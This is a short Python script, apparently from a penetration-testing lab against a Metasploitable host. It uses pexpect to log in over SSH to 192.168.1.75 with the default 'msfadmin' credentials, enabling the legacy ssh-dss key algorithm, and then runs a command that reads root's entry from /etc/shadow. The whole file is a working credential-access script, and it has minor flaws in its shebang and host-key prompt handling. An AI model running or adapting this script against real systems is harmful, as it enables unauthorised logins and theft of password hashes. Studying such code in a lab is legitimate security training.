#!usr/bin/python
import pexpect

PROMPT = ['#', '>>>', '>' ,'\$']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(hostkeyal, user, host, password):
    ssh_newkey = 'Are you sure, you want to continue connecting?'
    connStr = 'ssh'  + hostkeyal + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('[-] Error Connecting!!!')
        return
    if ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting!!!')
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    host = '192.168.1.75'
    user = 'msfadmin'
    hostkeyal = ' -oHostKeyAlgorithms=+ssh-dss '
    password = 'msfadmin'
    child = connect(hostkeyal,user,host,password)
    send_command(child, 'cat /etc/shadow | grep root;ps')
    
main()
